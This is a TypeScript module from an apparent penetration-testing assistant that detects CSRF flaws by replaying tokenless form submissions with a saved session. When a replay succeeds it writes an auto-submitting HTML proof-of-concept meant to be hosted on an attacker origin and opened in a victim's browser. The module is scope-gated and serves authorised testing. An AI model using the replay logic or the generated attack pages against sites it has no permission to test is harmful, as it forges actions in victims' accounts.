// csrfProve.ts — CSRF prover with standalone PoC artifact (csrf_prove).
//
// For state-changing forms/endpoints on ONE same-origin target:
//  1. parse <form> tags (action/method/inputs) + detect token fields
//     (csrf/token/nonce/authenticity/_token);
//  2. read cookie flags (SameSite!) from Set-Cookie;
//  3. replay the request WITHOUT the token using the caller's session —
//     accepted (2xx + state-change signal) = PROVEN candidate;
//  4. on PROVEN, write a standalone auto-submitting PoC HTML file to the
//     evidence dir (real file, like exploit_build).
//
// Verdicts are honest: PROVEN / TOKEN-ENFORCED / NO-FORMS / inconclusive —
// never "vulnerable" from a missing token field alone (could be header-based).
// Bounded (≤8 forms, ≤3 requests each), scope-gated, session-safe.
// Write — confirm.

import { mkdirSync, renameSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { targetAllowed, politeDelay } from "./security";
import { sessionHeaders } from "./httpSession";
import { sanitizeUser, userDataRoot } from "./users";

export type CsrfForm = { action: string; method: string; inputs: Array<{ name: string; value: string; type: string }>; raw: string };
export type CsrfVerdict = "PROVEN" | "TOKEN-ENFORCED" | "NO-FORMS" | "INCONCLUSIVE";

const TOKEN_NAME = /(csrf|xsrf|token|nonce|authenticity|_token|__requestverification)/i;
const MAX_FORMS = 8;

function resolveUrl(base: string, action: string): string {
  try {
    return new URL(action || base, base).toString();
  } catch {
    return "";
  }
}

/** Extract forms from HTML. Pure. */
export function parseForms(html: string, base: string): CsrfForm[] {
  const out: CsrfForm[] = [];
  const re = /<form\b([^>]*)>([\s\S]*?)(?:<\/form>|$)/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html || "")) && out.length < MAX_FORMS) {
    const attrs = m[1] || "";
    const inner = m[2] || "";
    const action = /action\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] ?? "";
    const method = (/method\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] || "GET").toUpperCase();
    if (method !== "POST" && method !== "PUT" && method !== "PATCH" && method !== "DELETE") continue;
    const inputs: CsrfForm["inputs"] = [];
    const ire = /<input\b([^>]*)\/?>/gi;
    let im: RegExpExecArray | null;
    while ((im = ire.exec(inner))) {
      const ia = im[1] || "";
      const name = /name\s*=\s*["']([^"']*)["']/i.exec(ia)?.[1] ?? "";
      if (!name) continue;
      inputs.push({
        name,
        value: /value\s*=\s*["']([^"']*)["']/i.exec(ia)?.[1] ?? "",
        type: (/type\s*=\s*["']([^"']*)["']/i.exec(ia)?.[1] || "text").toLowerCase(),
      });
    }
    out.push({ action: resolveUrl(base, action), method, inputs, raw: m[0].slice(0, 500) });
  }
  return out;
}

/** True when the form carries a CSRF token field. Pure. */
export function formHasToken(f: CsrfForm): boolean {
  return f.inputs.some((i) => TOKEN_NAME.test(i.name));
}

/** SameSite posture from Set-Cookie lines. Pure. */
export function sameSitePosture(setCookies: string[]): "lax-or-strict" | "none" | "missing" | "unknown" {
  const lines = (setCookies || []).filter(Boolean);
  if (!lines.length) return "unknown";
  let seen: string | null = null;
  for (const c of lines) {
    const m = /samesite\s*=\s*(lax|strict|none)/i.exec(c);
    if (m) seen = m[1].toLowerCase();
  }
  if (!seen) return "missing";
  return seen === "none" ? "none" : "lax-or-strict";
}

function escHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

/**
 * Render the standalone cross-origin PoC page (auto-submit, no token).
 * Deterministic — same form in, same file out. Pure.
 */
export function renderCsrfPoc(target: string, form: CsrfForm, findingId: string): string {
  const fields = form.inputs
    .filter((i) => !TOKEN_NAME.test(i.name))
    .map((i) => `    <input type="hidden" name="${escHtml(i.name)}" value="${escHtml(i.value || "csrf-probe-1")}">`)
    .join("\n");
  return `<!DOCTYPE html>
<!-- CSRF PoC — finding ${findingId} — HOST THIS FILE on an attacker origin,
     open it in a VICTIM browser session (logged in to ${escHtml(target)}).
     If the action executes without a token, CSRF is confirmed. Lab-only. -->
<html><body onload="document.f.submit()">
<form name="f" method="${form.method}" action="${escHtml(form.action || target)}">
${fields}
</form></body></html>
`;
}

export type FetchFn = (url: string, init?: { method?: string; headers?: Record<string, string>; body?: string }) => Promise<{ status: number; body: string; setCookies?: string[] }>;

async function defaultFetch(url: string, init: { method?: string; headers?: Record<string, string>; body?: string } = {}): Promise<{ status: number; body: string; setCookies: string[] }> {
  try {
    const res = await fetch(url, {
      method: init.method || "GET",
      headers: { "User-Agent": "mia-assistant/1.0", ...(init.headers || {}) },
      body: init.method && init.method !== "GET" && init.method !== "HEAD" ? init.body : undefined,
      redirect: "manual",
      signal: AbortSignal.timeout(12_000),
    });
    const getSet = (res.headers as unknown as { getSetCookie?: () => string[] }).getSetCookie;
    return { status: res.status, body: (await res.text()).slice(0, 12_000), setCookies: typeof getSet === "function" ? getSet.call(res.headers) : [] };
  } catch {
    return { status: 0, body: "", setCookies: [] };
  }
}

function evidenceDir(rawUser: unknown): string | null {
  const userKey = sanitizeUser(rawUser);
  if (!userKey) return null;
  return join(userDataRoot(), userKey, "reports", "evidence");
}

/**
 * Prove CSRF on a page/endpoint. Scope-gated, bounded.
 * `session`: saved http_session name whose cookies replay the victim state.
 */
export async function csrfProve(
  rawUser: unknown,
  opts: { url?: string; session?: string; fetchFn?: FetchFn } = {}
): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw)) return "Error: SCOPE — csrf_prove hanya untuk lab / engagement aktif.";
  const fetchFn = opts.fetchFn || defaultFetch;
  const sess = opts.session ? sessionHeaders(rawUser, opts.session) : null;
  if (opts.session && !sess) return `Error: session "${opts.session}" tidak dikenal (buat via http_session / auth_setup / har_import).`;
  const sessHeadersOut: Record<string, string> = { ...(sess?.headers || {}) };
  if (sess?.cookie) sessHeadersOut["cookie"] = sess.cookie;

  let page: { status: number; body: string; setCookies: string[] };
  try {
    await politeDelay();
    const p = await fetchFn(raw, { headers: sessHeadersOut });
    page = { status: p.status, body: p.body, setCookies: p.setCookies ?? [] };
  } catch (e) {
    return `Error: fetch gagal: ${e instanceof Error ? e.message : String(e)}`;
  }
  if (page.status === 0) return "Error: target tidak terjangkau.";
  const lines: string[] = [`🛡️ CSRF PROVE ${raw}`];
  const posture = sameSitePosture(page.setCookies ?? []);
  lines.push(`Cookie SameSite: ${posture}${posture === "missing" ? " (tanpa flag = browser default Lax modern; klasik + top-level POST tetap berisiko)" : ""}${posture === "none" ? " (cross-site cookie terkirim = CSRF-able)" : ""}`);
  const forms = parseForms(page.body, raw).filter((f) => {
    try {
      return new URL(f.action || raw).origin === new URL(raw).origin;
    } catch {
      return false;
    }
  });
  if (!forms.length) {
    lines.push("NO-FORMS: tidak ada form state-changing (POST/PUT/PATCH/DELETE) same-origin di halaman ini.");
    return lines.join("\n");
  }
  lines.push(`Form state-changing: ${forms.length} (same-origin).`);
  let proven = 0;
  for (const f of forms) {
    const target = f.action || raw;
    const tag = `${f.method} ${target}`;
    if (formHasToken(f)) {
      lines.push(`• ${tag} — punya field token → TIDAK diuji buta (verifikasi manual: replay tanpa token via http_request).`);
      continue;
    }
    // No token field: replay the action WITHOUT any token using session cookies.
    const body = new URLSearchParams();
    for (const i of f.inputs) if (i.name) body.set(i.name, i.value || "csrf-probe-1");
    let r: { status: number; body: string; setCookies: string[] };
    try {
      await politeDelay();
      const rr = await fetchFn(target, {
        method: f.method,
        headers: { ...sessHeadersOut, "Content-Type": "application/x-www-form-urlencoded" },
        body: body.toString(),
      });
      r = { status: rr.status, body: rr.body, setCookies: rr.setCookies ?? [] };
    } catch (e) {
      lines.push(`• ${tag} — tanpa token: request gagal (${e instanceof Error ? e.message : String(e)}) — inconclusive.`);
      continue;
    }
    if (r.status >= 200 && r.status < 300) {
      proven++;
      lines.push(`• ${tag} — 🔴 TANPA TOKEN diterima (${r.status}) → kandidat CSRF. Bukti penuh: buka PoC di browser korban.`);
      const dir = evidenceDir(rawUser);
      if (dir) {
        try {
          mkdirSync(dir, { recursive: true });
          const file = join(dir, `csrf-poc-${Date.now().toString(36)}.html`);
          const tmp = `${file}.tmp`;
          const { writeFileSync: w, renameSync: rn } = await import("node:fs");
          w(tmp, renderCsrfPoc(raw, f, "csrf"));
          rn(tmp, file);
          lines.push(`  📎 PoC tersimpan: ${file}`);
        } catch {
          lines.push("  (PoC gagal ditulis — buktikan manual.)");
        }
      }
    } else {
      lines.push(`• ${tag} — tanpa token ditolak (${r.status}) → TOKEN-ENFORCED / terkontrol.`);
    }
  }
  lines.push("");
  lines.push(proven ? `⚠️ ${proven} kandidat CSRF — konfirmasi cross-origin via PoC di atas, lalu \`poc_verify\` → \`finding_add\`.` : "Tidak ada kandidat CSRF yang terbukti (semua bertoken/ditolak/tanpa form).");
  return lines.join("\n");
}
